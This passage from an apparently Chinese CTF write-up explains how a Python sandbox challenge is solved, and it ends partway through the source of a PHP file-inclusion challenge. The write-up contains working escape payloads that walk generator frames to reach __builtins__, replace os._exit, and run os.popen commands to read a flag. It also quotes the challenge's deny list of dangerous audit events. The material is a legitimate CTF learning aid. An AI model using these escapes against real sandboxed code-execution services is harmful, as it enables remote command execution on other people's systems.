class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;两次密码不一致&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;用户不存在&#x27;</span>&#125;)</span><br><span class="line">    users[username][<span class="string">&#x27;password_md5&#x27;</span>] = hashlib.md5(new_password.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;密码重置成功！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>​		这是一个沙箱，可以执行代码，但是，存在三重检验，一个是源码层面的检验 <code>source_simple_check</code> ，需要代码里不存在这些黑名单关键词，第二层是字节码检验，第三层是运行时检验，也就是常说的 <code>addaudithook</code> ，主要需要绕过的是第一层和第三层，可以先从沙箱入手，想办法绕过沙箱，不过，沙箱中的 <code>&quot;__builtins__&quot;: safe_builtins</code> ，可知内建函数中没有可以让我们导入的东西，那么可以想办法逃逸出沙箱，到更外层可能会有可以使用的点，所以用栈帧逃逸逃到外界即可。</p>
<p>​		首先是想办法逃逸到外界，我们可以确定的是，外界的程序里肯定是有 <code>&quot;__builtins__&quot;</code>  的，那么就可以通过如下方式进行绕过：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f7cb887bbd0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;/app/app.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;Flask&#x27;: &lt;class &#x27;flask.app.Flask&#x27;&gt;, &#x27;request&#x27;: &lt;Request &#x27;http://47.92.129.245:5000/admin/oj&#x27; [POST]&gt;, &#x27;jsonify&#x27;: &lt;function jsonify at 0x7f7cb7976a20&gt;, &#x27;render_template&#x27;: &lt;function render_template at 0x7f7cb769c680&gt;, &#x27;session&#x27;: &lt;Secu。。。。。。。。</span></span><br></pre></td></tr></table></figure>
<p>​		可见，这里存在 <code>&quot;__builtins__&quot;</code> ，可惜是个函数，那么，看看这一层是哪一层：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b) </span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;frame at 0x7f7cb76e3de0, file &#x27;/app/app.py&#x27;, line 263, code oj&gt;</span></span><br></pre></td></tr></table></figure>
<p>​		先来做个 test 文件测试下，将这两个沙箱函数稍微改改，本地调试下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code_obj</span>):</span><br><span class="line">    opcode_io = StringIO()</span><br><span class="line">    dis(code_obj, file=opcode_io)</span><br><span class="line">    opcodes = opcode_io.getvalue().splitlines()</span><br><span class="line">    opcode_io.close()</span><br><span class="line"></span><br><span class="line">    allowed_globals = &#123;<span class="string">&quot;print&quot;</span>, <span class="string">&quot;len&quot;</span>, <span class="string">&quot;str&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;float&quot;</span>, <span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;seed&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;LOAD_GLOBAL&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;IMPORT_NAME&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Import statements are not allowed&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;LOAD_METHOD&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    dangerous_events = &#123;</span><br><span class="line">        <span class="string">&quot;os.system&quot;</span>, <span class="string">&quot;os.popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.call&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.check_output&quot;</span>, <span class="string">&quot;subprocess.run&quot;</span>, <span class="string">&quot;subprocess.getoutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;builtins.eval&quot;</span>, <span class="string">&quot;builtins.compile&quot;</span>, <span class="string">&quot;builtins.__import__&quot;</span>, <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;import&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;importlib.import_module&quot;</span>,</span><br><span class="line">        <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os.open&quot;</span>, <span class="string">&quot;os.read&quot;</span>, <span class="string">&quot;os.write&quot;</span>,</span><br><span class="line">        <span class="string">&quot;urllib.request.urlopen&quot;</span>, <span class="string">&quot;urllib.request.Request&quot;</span>, <span class="string">&quot;requests.&quot;</span>, <span class="string">&quot;socket.socket&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http.client.HTTPConnection&quot;</span>, <span class="string">&quot;http.client.HTTPSConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ctypes.&quot;</span>, <span class="string">&quot;marshal.loads&quot;</span>, <span class="string">&quot;os.execv&quot;</span>, <span class="string">&quot;os.execve&quot;</span>, <span class="string">&quot;os.execvp&quot;</span>, <span class="string">&quot;os.execvpe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.environ&quot;</span>, <span class="string">&quot;os.getenv&quot;</span>, <span class="string">&quot;os.getpid&quot;</span>, <span class="string">&quot;os.getuid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;os.system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.remove&quot;</span>, <span class="string">&quot;os.unlink&quot;</span>, <span class="string">&quot;os.chmod&quot;</span>, <span class="string">&quot;os.chown&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> dangerous_event <span class="keyword">in</span> dangerous_events:</span><br><span class="line">        <span class="keyword">if</span> event == dangerous_event <span class="keyword">or</span> event.startswith(dangerous_event + <span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>​		可以简单整改下源码任期能够在本地运行，之后就是调试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fcb0591f090&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;,。。。。。。。。。</span></span><br></pre></td></tr></table></figure>
<p>​		这里的 <code>&quot;__builtins__&quot;</code>  是模块，但是因为第一层 waf 过滤太多关键字了，所以根据模块的调用方式这个似乎没法进行绕过，那么再回溯一层再看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#。。。。。。&#x27;__builtins__&#x27;: &#123;&#x27;__name__&#x27;: &#x27;builtins&#x27;, &#x27;__doc__&#x27;: &quot;Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all &#x27;built-in&#x27;\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThi 。。。。。。</span></span><br></pre></td></tr></table></figure>
<p>​		这里就成了字典，那么就可以进行绕过了，这里成功获取了 <code>&quot;__builtins__&quot;</code>  的字典，那么在题目里测试下看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok</span></span><br></pre></td></tr></table></figure>
<p>​		证明是成功了，但是，这里需要注意，如果直接输出 b 会导致程序 crash 掉，尽可能别输出，这似乎是别的什么问题导致的报错。</p>
<p>​		既然有了 <code>&quot;__builtins__&quot;</code>  之后，那么就可以考虑直接把 <code>os._exit(0)</code>  给杨掉，这样就算执行了 <code>system</code>  之类的函数也不会报错，直接扔下 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br></pre></td></tr></table></figure>
<p>​		这里通过了 <code>__builtins__</code> 中的 <code>setattr</code>  修改了 <code>os</code>  中的 <code>_exit</code>  为 <code>print</code> ，那么就算被钩子检测到了，也不用担心被直接退出了，之后就是直接 RCE 了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0。。。。。。</span></span><br><span class="line"><span class="comment">#root</span></span><br></pre></td></tr></table></figure>
<p>​		因为不能使用 <code>read()</code> （在关键词上被禁用了），所以这里只有通过这种方式进行绕过了，通过 <code>getattr</code>  获取 <code>popen</code>  执行过后的对象中的 <code>_proc</code>  之后用 <code>stdout</code>  进行输出</p>
<p>​			先贴一个 payload，最后 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br></pre></td></tr></table></figure>
<p>​		这里就对这个 payload 就行下讲解就行了，就不一步步进行调试了：</p>
<p>​		首先，三个 waf 函数里，第二个 waf 作用不是很大，但是会导致 <code>#错误: 执行错误: Disallowed global access: q</code> ，不过像之后那样就不会出现这个报错。第一个主要是杨掉了常见的字段，第三个则是沙箱的核心点，虽然看上去第三个 waf 防的很死，但是用处不大，因为是用的 <code>os._exit()</code>  直接 exit 掉了，所以这里直接给 os 里的这个方法给杨掉就行了，不需要在意，所以这里的 payload 就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;cat /aaaFffLllA44Ggg&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br></pre></td></tr></table></figure>
<p>​		这里贴一下 k13in 大佬的 poc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    x=(x.gi_frame.f_back <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>]); <span class="keyword">return</span> [*x][<span class="number">0</span>]</span><br><span class="line">fr=f(); k=<span class="string">&quot;\x6f\x73&quot;</span>.encode().decode(<span class="string">&quot;unicode_escape&quot;</span>); p=fr</span><br><span class="line"><span class="keyword">while</span> p:</span><br><span class="line">    g=p.f_globals</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> g:</span><br><span class="line">        o=g[k]</span><br><span class="line">        <span class="built_in">print</span>([e.name <span class="keyword">for</span> e <span class="keyword">in</span> o.scandir(<span class="string">&quot;/&quot;</span>)])</span><br><span class="line">        <span class="built_in">print</span>([e.name <span class="keyword">for</span> e <span class="keyword">in</span> o.scandir(<span class="string">&quot;/app&quot;</span>)])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p=p.f_back</span><br></pre></td></tr></table></figure>
<h2 id="ez_include复现"><a class="markdownIt-Anchor" href="#ez_include复现">#</a> <strong>ez_include</strong>（复现）</h2>
<blockquote>
<p>不太一样的文件包含</p>
</blockquote>
<p>​		贴个源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span> === <span class="string">&#x27;tmp&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$tmpDir</span> = <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$tmpDir</span>) || !<span class="title function_ invoke__">is_readable</span>(<span class="variable">$tmpDir</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;/tmp目录不可访问或不存在&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$tmpDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$files</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;无法扫描/tmp目录&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phpFiles</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span 